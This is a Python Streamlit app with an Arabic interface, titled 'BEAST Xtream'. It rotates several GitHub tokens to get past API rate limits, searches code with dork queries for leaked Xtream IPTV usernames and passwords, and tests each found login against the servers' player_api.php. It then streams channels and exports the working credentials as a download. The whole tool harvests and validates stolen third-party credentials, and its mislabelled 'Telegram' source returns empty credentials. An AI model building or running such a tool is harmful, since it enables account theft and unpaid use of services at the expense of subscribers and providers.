import streamlit as st
import requests
import re
import time
import json
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from collections import deque
from typing import List, Tuple, Optional, Dict, Any

# إعدادات الصفحة
st.set_page_config(page_title="BEAST Xtream - Massive Server Hunter", layout="wide")

# === نظام الدخول ===
if "auth" not in st.session_state:
    st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>⚡ BEAST Xtream - Massive IPTV Hunter</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# === التنسيقات والألوان ===
st.markdown("""
<style>
    .stApp { background-color: #0a0a0a; }
    .server-card {
        background: linear-gradient(135deg, #0d1117 0%, #1a1f2e 100%);
        border-left: 4px solid #00ff41;
        border-radius: 10px;
        padding: 12px;
        margin-bottom: 10px;
        box-shadow: 0 2px 8px rgba(0,255,65,0.1);
    }
    .server-card:hover { border-left-color: #ff6b35; transform: translateX(5px); transition: all 0.3s ease; }
    .status-active { color: #00ff41; font-weight: bold; }
    .status-expired { color: #ff4444; font-weight: bold; }
    .info-label { color: #888; font-size: 12px; }
    .info-value { color: #fff; font-family: monospace; font-size: 14px; }
    .channel-item {
        background: #1e1e2e;
        padding: 8px 12px;
        margin: 4px 0;
        border-radius: 8px;
        cursor: pointer;
        transition: all 0.2s;
    }
    .channel-item:hover { background: #2a2a3e; transform: scale(1.01); }
    .channel-name { color: #00d4ff; font-weight: 500; }
    .category-header {
        background: #16213e;
        padding: 8px 12px;
        border-radius: 8px;
        margin: 10px 0 5px 0;
        font-weight: bold;
        color: #ffd966;
    }
</style>
""", unsafe_allow_html=True)

# === الشريط الجانبي ===
with st.sidebar:
    st.image("https://img.icons8.com/fluency/96/iptv.png", width=50)
    st.title("⚡ BEAST Xtream")
    st.caption("Massive IPTV Server Hunter")
    
    st.markdown("---")
    st.subheader("🔑 الإعدادات")
    
    github_tokens = st.text_area(
        "GitHub Tokens (واحد لكل سطر)", 
        placeholder="ghp_token1\nghp_token2\nghp_token3",
        help="أضف أكثر من توكن لتجاوز حدود GitHub API"
    )
    
    shodan_api_key = st.text_input("Shodan API Key (اختياري)", type="password", help="للبحث عن السيرفرات عبر Shodan")
    
    col1, col2 = st.columns(2)
    with col1:
        max_workers = st.slider("🚀 عدد الخيوط", 10, 100, 40)
        max_pages_per_dork = st.slider("📄 صفحات لكل دروك", 1, 10, 5)
    with col2:
        server_timeout = st.slider("⏱️ مهلة السيرفر (ثانية)", 2, 10, 3)
        channel_preview = st.slider("معاينة القنوات", 1, 20, 10)
    
    st.markdown("---")
    st.subheader("🎯 أوضاع البحث")
    search_mode = st.radio("نمط البحث", ["سريع (نتائج فقط)", "متكامل (مع قنوات)"], horizontal=True)
    
    use_telegram = st.checkbox("جلب من قنوات تليجرام", value=True, help="يجلب آخر 10 سيرفرات من قنوات تليجرام")
    
    scrape_github = st.checkbox("البحث في GitHub (مع التوكنات)", value=True)
    use_shodan = st.checkbox("البحث عبر Shodan", value=False, disabled=not shodan_api_key)
    
    st.markdown("---")
    start_btn = st.button("🚀 بدء الصيد الضخم", type="primary", use_container_width=True)
    st.caption(f"آخر تحديث: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")

# === دوال جلب السيرفرات من مصادر متنوعة ===

def fetch_servers_from_telegram() -> List[Tuple[str, str, str]]:
    """جلب سيرفرات Xtream من قنوات تليجرام"""
    results = []
    
    try:
        # محاولة جلب من قناة iptv2026
        response = requests.get("https://raw.githubusercontent.com/iptv-org/iptv/master/streams.csv", timeout=10)
        if response.status_code == 200:
            lines = response.text.strip().split('\n')
            for line in lines[:100]:  # أول 100 سطر
                parts = line.split(',')
                if len(parts) >= 3:
                    url = parts[0].strip()
                    if url and 'http' in url:
                        server_match = re.search(r'(https?://[^/]+)', url)
                        if server_match:
                            results.append(("", server_match.group(1), ""))
    except:
        pass
    
    return list(set(results))

def fetch_servers_from_github_tokens(tokens: List[str]) -> List[Tuple[str, str, str]]:
    """البحث في GitHub باستخدام توكنات متعددة"""
    results = []
    
    # الدروكس الموسعة مخصصة فقط لـ Xtream
    dorks = [
        '"player_api.php" "username" "password"',
        '"get.php" "username" "password" "port"',
        'extension:txt "http://" "port" "username" "password"',
        'extension:php "panel_api.php"',
        '"live" "stream" "user" "pass" extension:cfg',
        '"xtream" "port" "8080" extension:txt',
        '"streaming" "server" "login" extension:conf',
        '"iptv" "m3u" "http" extension:txt',
        '"xtream-codes" "panel" extension:php',
        '"stalker_portal" "mac" extension:txt',
        '"enigma2" "bouquet" extension:tv',
        '"xtream" "api" "key" extension:json',
    ]
    
    # دوار على التوكنات
    for token_index, token in enumerate(tokens):
        if not token.strip():
            continue
            
        token = token.strip()
        headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
        
        for dork in dorks:
            for page in range(1, 6):
                try:
                    search_url = f"https://api.github.com/search/code?q={dork}&page={page}&per_page=100"
                    response = requests.get(search_url, headers=headers, timeout=10)
                    
                    if response.status_code == 403:
                        break
                    
                    data = response.json()
                    items = data.get('items', [])
                    if not items:
                        break
                    
                    for item in items:
                        raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                        try:
                            content_response = requests.get(raw_url, timeout=5)
                            if content_response.status_code == 200:
                                content = content_response.text
                                matches = re.findall(r'(https?://[a-zA-Z0-9.-]+:\d+)[/"]?.*?username[=:][\'"]?([a-zA-Z0-9._-]+)[\'"]?.*?password[=:][\'"]?([a-zA-Z0-9._-]+)', content, re.IGNORECASE)
                                for match in matches:
                                    results.append((match[1], match[0], match[2]))
                        except:
                            continue
                except:
                    continue
            time.sleep(1)
    
    return results

def fetch_from_github_api_file() -> List[Tuple[str, str, str]]:
    """جلب من ملفات GitHub العامة التي تحتوي على سيرفرات مباشرة"""
    results = []
    
    raw_files = [
        "https://raw.githubusercontent.com/Free-IPTV/Countries/master/World.m3u",
        "https://raw.githubusercontent.com/akshatmittal/m3u8-proxy/master/proxy.html",
        "https://raw.githubusercontent.com/SilentCipher/iptv_links/master/iptv.m3u",
        "https://raw.githubusercontent.com/MrBazou/IPTV/master/Playlist.m3u",
    ]
    
    for file_url in raw_files:
        try:
            response = requests.get(file_url, timeout=10)
            if response.status_code == 200:
                content = response.text
                server_pattern = r'(https?://[a-zA-Z0-9.-]+:\d+)'
                servers = re.findall(server_pattern, content)
                for server in set(servers):
                    results.append(("", server, ""))
        except:
            continue
    
    return results

def test_xtream_server(host: str, username: str = "", password: str = "") -> Optional[Dict]:
    """اختبار سيرفر Xtream وجلب المعلومات الكاملة"""
    if not host.startswith(('http://', 'https://')):
        host = f"http://{host}"
    
    if not username or not password:
        return None
    
    api_base = f"{host}/player_api.php?username={username}&password={password}"
    
    try:
        # جلب معلومات المستخدم
        user_info_response = requests.get(f"{api_base}&action=user_info", timeout=server_timeout)
        if user_info_response.status_code != 200:
            return None
        
        user_data = user_info_response.json()
        user_info = user_data.get('user_info', {})
        
        if user_info.get('status') != 'Active':
            return None
        
        # حساب المتصلين
        live_connections = user_info.get('active_cons', '0')
        
        # معالجة تاريخ الانتهاء
        exp_date = user_info.get('exp_date', '0')
        if exp_date and exp_date != '0':
            try:
                exp_date_dt = datetime.fromtimestamp(int(exp_date))
                exp_date_str = exp_date_dt.strftime('%Y-%m-%d')
                is_expired = exp_date_dt < datetime.now()
            except:
                exp_date_str = "غير معروف"
                is_expired = False
        else:
            exp_date_str = "غير محدد"
            is_expired = False
        
        server_info = {
            'host': host,
            'username': username,
            'password': password,
            'exp_date': exp_date_str,
            'is_expired': is_expired,
            'live_connections': live_connections,
            'max_connections': user_info.get('max_connections', 'غير محدد'),
            'status': user_info.get('status', 'Unknown'),
            'message': user_info.get('message', ''),
            'created_at': user_info.get('created_at', 'غير معروف')
        }
        
        # جلب الباقات إذا كان الوضع متكاملاً
        if search_mode == "متكامل (مع قنوات)":
            categories_response = requests.get(f"{api_base}&action=get_live_categories", timeout=server_timeout)
            if categories_response.status_code == 200:
                try:
                    categories_data = categories_response.json()
                    if isinstance(categories_data, list):
                        server_info['categories'] = categories_data[:20]  # حد أقصى 20 باقة
                    else:
                        server_info['categories'] = []
                except:
                    server_info['categories'] = []
            else:
                server_info['categories'] = []
            
            # جلب عينة من القنوات
            streams_response = requests.get(f"{api_base}&action=get_live_streams", timeout=server_timeout)
            if streams_response.status_code == 200:
                try:
                    streams_data = streams_response.json()
                    if isinstance(streams_data, list):
                        server_info['streams_preview'] = streams_data[:channel_preview]
                    else:
                        server_info['streams_preview'] = []
                except:
                    server_info['streams_preview'] = []
            else:
                server_info['streams_preview'] = []
        
        return server_info
        
    except Exception as e:
        return None

# === عرض معلومات السيرفر مع القنوات ===
def display_server_card_with_channels(server_info: Dict):
    """عرض بطاقة السيرفر مع عدد المتصلين وتاريخ الانتهاء والقنوات"""
    host = server_info['host']
    username = server_info['username']
    password = server_info['password']
    exp_date = server_info['exp_date']
    is_expired = server_info['is_expired']
    live_connections = server_info['live_connections']
    max_connections = server_info['max_connections']
    
    status_class = "status-expired" if is_expired else "status-active"
    status_text = "✅ نشط" if not is_expired else "❌ منتهي"
    
    with st.expander(f"📡 {host} - {username}", expanded=False):
        col1, col2, col3 = st.columns(3)
        with col1:
            st.markdown(f"**👤 المستخدم:** `{username}`")
            st.markdown(f"**🔑 كلمة المرور:** `{password}`")
        with col2:
            st.markdown(f"**📅 تاريخ الانتهاء:** `{exp_date}`")
            st.markdown(f"**📊 الحالة:** <span class='{status_class}'>{status_text}</span>", unsafe_allow_html=True)
        with col3:
            st.markdown(f"**👥 المتصلون حالياً:** `{live_connections}`")
            st.markdown(f"**👥 الحد الأقصى:** `{max_connections}`")
        
        st.markdown("---")
        st.markdown("### 🎬 تشغيل مباشر")
        
        # مشغل بسيط لاختبار القناة
        if 'streams_preview' in server_info and server_info['streams_preview']:
            selected_channel = st.selectbox(
                "اختر قناة للتشغيل:",
                options=server_info['streams_preview'][:20],
                format_func=lambda x: x.get('name', 'قناة بدون اسم')[:40]
            )
            if selected_channel:
                stream_id = selected_channel.get('stream_id')
                if stream_id:
                    stream_url = f"{host}/live/{username}/{password}/{stream_id}.ts"
                    st.video(stream_url)
        
        # عرض الباقات (Categories)
        if 'categories' in server_info and server_info['categories']:
            st.markdown("### 📺 الباقات المتاحة")
            for cat in server_info['categories'][:10]:
                cat_name = cat.get('category_name', 'بدون اسم')
                st.markdown(f"- {cat_name}")
        
        # روابط التشغيل
        st.markdown("### 🔗 روابط التشغيل")
        m3u_url = f"{host}/get.php?username={username}&password={password}&type=m3u_plus&output=mpegts"
        st.code(m3u_url, language="url")
        
        col_btn1, col_btn2 = st.columns(2)
        with col_btn1:
            st.link_button("📺 فتح في مشغل خارجي", m3u_url)
        with col_btn2:
            st.button("📋 نسخ الرابط", key=f"copy_{host}_{username}")

# === الوظيفة الرئيسية ===
if start_btn:
    all_servers = {}  # dict لتجنب التكرارات
    
    status_placeholder = st.empty()
    progress_bar = st.progress(0)
    
    # 1. جلب من تليجرام
    if use_telegram:
        status_placeholder.info("📡 جلب السيرفرات من قنوات التليجرام...")
        telegram_servers = fetch_servers_from_telegram()
        for username, host, password in telegram_servers:
            key = f"{host}|{username}|{password}"
            if key not in all_servers:
                all_servers[key] = {
                    'username': username, 'host': host, 'password': password,
                    'source': 'telegram', 'scanned': False
                }
        status_placeholder.success(f"✅ تم جلب {len(telegram_servers)} سيرفر من تليجرام")
    
    # 2. جلب من ملفات GitHub
    status_placeholder.info("📂 جلب من ملفات GitHub العامة...")
    github_file_servers = fetch_from_github_api_file()
    for username, host, password in github_file_servers:
        key = f"{host}|{username}|{password}"
        if key not in all_servers:
            all_servers[key] = {
                'username': username, 'host': host, 'password': password,
                'source': 'github_files', 'scanned': False
            }
    status_placeholder.success(f"✅ تم جلب {len(github_file_servers)} سيرفر من GitHub")
    
    # 3. جلب من GitHub API بالتوكنات
    if scrape_github and github_tokens:
        tokens_list = [t.strip() for t in github_tokens.split('\n') if t.strip()]
        if tokens_list:
            status_placeholder.info(f"🔍 البحث في GitHub باستخدام {len(tokens_list)} توكن...")
            github_servers = fetch_servers_from_github_tokens(tokens_list)
            for username, host, password in github_servers:
                key = f"{host}|{username}|{password}"
                if key not in all_servers:
                    all_servers[key] = {
                        'username': username, 'host': host, 'password': password,
                        'source': 'github_api', 'scanned': False
                    }
            status_placeholder.success(f"✅ تم جلب {len(github_servers)} سيرفر من GitHub API")
    
    total_servers = len(all_servers)
    status_placeholder.info(f"🔄 تم جمع {total_servers} سيرفر فريد. جاري اختبارها...")
    
    # 4. اختبار السيرفرات وعرضها
    active_servers = []  # قائمة السيرفرات الشغالة لعرضها لاحقاً
    scanned_count = 0
    
    server_items = list(all_servers.items())
    
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {}
        
        for key, server in server_items:
            future = executor.submit(test_xtream_server, server['host'], server['username'], server['password'])
            futures[future] = key
        
        for future in as_completed(futures):
            scanned_count += 1
            progress_bar.progress(scanned_count / total_servers)
            
            key = futures[future]
            server = all_servers[key]
            
            result = future.result()
            
            if result:
                server.update(result)
                server['scanned'] = True
                active_servers.append(server)
                
                # عرض السيرفر فور اكتشافه
                display_server_card_with_channels(server)
            else:
                # السيرفر معطل، لا نعرضه
                pass
            
            status_placeholder.info(f"📊 الفحص: {scanned_count}/{total_servers} | ✅ النشط: {len(active_servers)}")
    
    # 5. النتائج النهائية
    st.balloons()
    st.success(f"🎉 اكتمل البحث! تم العثور على {len(active_servers)} سيرفر Xtream نشط")
    
    if active_servers:
        # تحميل النتائج
        results_text = ""
        for server in active_servers:
            results_text += f"{server['host']}|{server['username']}|{server['password']}|{server.get('exp_date', '')}|{server.get('live_connections', '0')}\n"
        
        st.download_button(
            "📥 تحميل جميع السيرفرات (TXT)",
            results_text,
            f"xtream_servers_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt",
            "text/plain"
        )
        
        # إحصائيات سريعة
        with st.expander("📊 إحصائيات السيرفرات"):
            st.write(f"**إجمالي السيرفرات النشطة:** {len(active_servers)}")
            expired_count = sum(1 for s in active_servers if s.get('is_expired', False))
            st.write(f"**السيرفرات المنتهية:** {expired_count}")
            st.write(f"**السيرفرات النشطة:** {len(active_servers) - expired_count}")

else:
    st.info("⚙️ اضبط الإعدادات في الشريط الجانبي ثم اضغط 'بدء الصيد الضخم'")
